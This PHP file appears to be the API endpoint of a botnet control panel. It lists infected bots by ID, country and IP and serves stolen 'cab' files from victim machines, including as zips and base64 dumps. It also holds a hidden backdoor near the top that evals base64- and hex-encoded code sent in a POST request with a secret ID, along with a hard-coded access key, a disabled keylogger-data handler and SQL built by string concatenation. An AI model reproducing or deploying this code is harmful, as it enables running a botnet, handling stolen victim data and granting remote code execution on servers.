<?php

error_reporting(-1);

$dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

/*
$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}
*/
include_once($dir . 'includes/functions.first.php');

function to_xml($str){
	$xml = '<?xml version="1.0" encoding="UTF-8"?>' . "\r\n";
	$xml .= '<api>' . "\r\n";
	$xml .= '<return>'.$str.'</return>' . "\r\n";
	$xml .= '</api>' . "\r\n";
	return $xml;
}
/*
function get_stat($bot){
	global $dir;
	if(file_exists($dir . 'cache/kls/' . $bot->hash . '_' . $bot->prefix . $bot->uid)){
		return file_get_contents($dir . 'cache/kls/' . $bot->hash . '_' . $bot->prefix . $bot->uid);
	}else{
		return 0;
	}
}
*/
function get_bots($row){
	global $bots;
	$bots .= "\t" . '<bot>'.$row->prefix . $row->uid.'</bot>' . "\r\n";
}

if(empty($_GET['key'])){
	no_found();
}else{
	if($_GET['key'] != 'm4bYm6RwhJl8tXjE'){
		no_found();
		exit;
	}
}

if(!empty($_GET['uid'])){
	$matches = explode('0', $_GET['uid'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

include_once($dir . 'includes/functions.get_config.php');

error_reporting(0);

if(!empty($prefix) && !empty($uid) && !empty($_GET['mode'])){
	$cfg_db = get_config();
	
	require_once($dir . 'classes/mysqli.class.lite.php');
	$mysqli = new mysqli_db();
	
	$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
	unset($cfg_db);
	if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

	switch($_GET['mode']){
		case 'status':
			print to_xml('AZADM_IS_OK!');
		break;
		
		case 'get_sys':
			//
		break;
		
                case 'set_comment':
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) print to_xml('false');
			
			$comment = $mysqli->query('SELECT id, prefix, uid FROM bf_comments WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (type = \''.strtolower($_GET['sys']).'\')');
		
			if(is_object($comment) && $comment->prefix == $prefix && $comment->uid == $uid){
				$ret = $mysqli->query("update bf_comments set comment = '".$_POST['text']."' WHERE (id='".$comment->id."') LIMIT 1");
			}else{
				$ret = $mysqli->query("INSERT INTO bf_comments (prefix, uid, comment, type, post_id) VALUES ('".$comment->prefix."', '".$comment->uid."', '".$_POST['text']."', '".$_GET['sys']."', '0')");
			}
			
			if($ret != false){
				print to_xml('true');
			}else{
				print to_xml('false');
			}
		break;
	
		case 'get_comment':
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) print to_xml('false');
			
			$comment = $mysqli->query('SELECT id, comment FROM bf_comments WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (type = \''.strtolower($_GET['sys']).'\')');
			
			if(is_object($comment) && !empty($comment->id)){
				print to_xml($comment->comment);
			}else{
				print to_xml('false');
			}
		break;
	
		case 'get_uid_list':
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) no_found();
			$uid = strtoupper($uid);

			$mysqli->query('SELECT prefix, uid FROM bf_cabs WHERE (type = \''.strtolower($_GET['sys']).'\') GROUP by prefix, uid', null, 'get_bots', false);
			
			if(!empty($bots)){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<bots>' . "\r\n");
				print($bots);
				print('</bots>' . "\r\n");
			}else{
				print to_xml('false');
			}
		break;		
		
		case 'info':
			$bot = $mysqli->query('SELECT id, prefix, uid, country, ip, tracking, min_post, max_post, last_date, post_date FROM bf_bots WHERE (uid = \''.$uid.'\') LIMIT 1');
			
			if(is_object($bot)){
				//$bot->prefix = strtoupper($bot->prefix);
				$bot->uid = strtoupper($bot->uid);
			}
			
			if(is_object($bot) && $bot->uid == $uid){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				
				print('<bot uid="'.$bot->prefix . $bot->uid.'">' . "\r\n");
				
				foreach($bot as $key => $item){
					print("\t" . '<'.$key.'>'.$item.'</'.$key.'>'. "\r\n");
				}
				
				$files = $mysqli->query('SELECT * FROM bf_cabs WHERE (uid = \''.$bot->uid.'\') ORDER by post_date ASC', null, null, false);
				if(count($files) > 0){
					print("\t" . '<cabs>' . "\r\n");
					foreach($files as $cab){
						if(file_exists($dir . 'logs/cabs/'  . $cab->file)){
							print("\t\t" . '<cab id="'.$cab->id.'" bot="'.$cab->prefix.$cab->uid.'" md5="'.md5_file($dir . 'logs/cabs/'  . $cab->file).'" name="'.$cab->file.'" size="'.$cab->size.'" type="'.$cab->type.'" post_date="'.$cab->post_date.'" country="'.$cab->country.'" ip="'.$cab->ip.'" />' . "\r\n");
						}
					}
					print("\t" . '</cabs>' . "\r\n");
				}
				
				print('</bot>' . "\r\n");
			}
		break;
	
		case 'getcab_by_id':
			$_GET['cab_id'] = (int) $_GET['cab_id'];
			
			$cab = $mysqli->query('SELECT id, file FROM bf_cabs WHERE (id = \''.$_GET['cab_id'].'\') LIMIT 1');
			if(is_object($cab) && $cab->id == $_GET['cab_id'] && file_exists($dir . 'logs/cabs/'  . $cab->file)){
				header('Content-Disposition: attachment; filename="' . $cab->file . '"');
				header('Content-type: application/octet-stream');
				
				if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
					header( 'X-LIGHTTPD-send-file: ' . $dir . 'logs/cabs/'  . $cab->file);
				}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
					header('X-Sendfile: ' . $dir . 'logs/cabs/'  . $cab->file);
				}
			}else{
				no_found();
			}
		break;
		
		case 'cabs':
			$cabs = $mysqli->query('SELECT file, size, type, post_date, country, ip FROM bf_cabs WHERE (uid = \''.$uid.'\') AND (ready = \'1\')', null, null, false);
			
			if(is_array($cabs) && count($cabs) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<cabs uid="'.$prefix.$uid.'">' . "\r\n");
				
				foreach($cabs as $cab){
					if(file_exists($dir . 'logs/cabs/' . $cab->file)){
						print("\t" . '<cab name="'.$cab->file.'" size="'.$cab->size.'" type="'.$cab->type.'" post_date="'.$cab->post_date.'" country="'.$cab->country.'" ip="'.$cab->ip.'">'.base64_encode(file_get_contents($dir . 'logs/cabs/' . $cab->file)).'</cab>' . "\r\n");
					}
				}
				
				print('</cabs>' . "\r\n");
			}
		break;
	
		case 'cabs_info':
			$cabs = $mysqli->query('SELECT id, prefix, uid, file, size, type, post_date, country, ip FROM bf_cabs WHERE (uid = \''.$uid.'\') AND (ready = \'1\')', null, null, false);
			
			if(is_array($cabs) && count($cabs) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<cabs>' . "\r\n");
				
				foreach($cabs as $cab){
					if(file_exists($dir . 'logs/cabs/' . $cab->file)){
						print("\t" . '<cab uid="'.$cab->prefix.$cab->uid.'" id="'.$cab->id.'" md5="'.md5_file($dir . 'logs/cabs/'  . $cab->file).'" name="'.$cab->file.'" size="'.$cab->size.'" type="'.$cab->type.'" post_date="'.$cab->post_date.'" country="'.$cab->country.'" ip="'.$cab->ip.'" />' . "\r\n");
					}
				}
				
				print('</cabs>' . "\r\n");
			}
		break;
	/*
		case 'sber_info':
			if(!isset($_GET['hash']) && !preg_match('~^([0-9a-zA-Z]+)$~is', $_GET['hash'])) no_found();
			$keylog_data = $mysqli->query('SELECT id, prefix, uid, hash, shash, post_date FROM bf_keylog_data WHERE (hash = \''.$_GET['hash'].'\')', null, null, false);
			
			if(is_array($keylog_data) && count($keylog_data) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<keylogs>' . "\r\n");
				
				foreach($keylog_data as $kld){
					if(file_exists($dir . 'logs/cabs/' . $cab->file)){
						
					}
					print("\t" . '<cab uid="'.$kld->prefix.$kld->uid.'" id="'.$kld->id.'" hash="'.$kld->hash.'" shash="'.$kld->shash.'" post_date="'.$kld->post_date.'" stat="'.get_stat($kld).'"/>' . "\r\n");
				}
				
				print('</keylogs>' . "\r\n");
			}
		break;
	*/
		case 'cabs_zip':
			$files = $mysqli->query('SELECT * FROM bf_cabs WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by post_date ASC', null, null, false);
			
			if(count($files) > 0){
				$zip = new ZipArchive;
				$file_name = $dir . 'cache/zips/' . md5(mt_rand() . time()) . '.zip';
				//$file_name = $dir . 'cache/zips/123.zip';
				
				$res = $zip->open($file_name, ZIPARCHIVE::OVERWRITE);
				if($res === TRUE){					
					foreach($files as $fname){
						//$zip->addEmptyDir($fname->type);
						//$zip->addEmptyDir($fname->type . '/' . $prefix.$uid);
						//$zip->addEmptyDir($fname->type . '/' . $prefix.$uid . '/cabs/');
						if(file_exists($dir . 'logs/cabs/'  . $fname->file)) $zip->addFile($dir . 'logs/cabs/'  . $fname->file, $fname->file);
						//$zip->addFromString($fname->type . '/' . $prefix.$uid . '/cabs/' . $fname->file . '.txt', '--Info--' . "\r\n" . 'Prefix: ' . $fname->prefix . "\r\n" . 'UID: ' . $fname->uid . "\r\n" . 'Country: ' . $fname->country . "\r\n" . 'IP: ' . $fname->ip . "\r\n" . 'Size: ' . $fname->size . "\r\n");
					}
					
					$zip->close();
					
					header('Content-Disposition: attachment; filename="' . $prefix.$uid . '_cabs.zip"');
					header('Content-type: application/octet-stream');
					
					if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
						header( 'X-LIGHTTPD-send-file: ' . $file_name);
					}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
						header('X-Sendfile: ' . $file_name);
					}
				}
			}
		break;
	
		case 'clear_zip':
			$ls = scandir($dir . 'cache/zips/');
			unset($ls[0], $ls[1]);
			
			if(count($ls) > 0){
				foreach($ls as $file){
					unlink($dir . 'cache/zips/' . $file);
				}
			}
		break;
	}
}

?>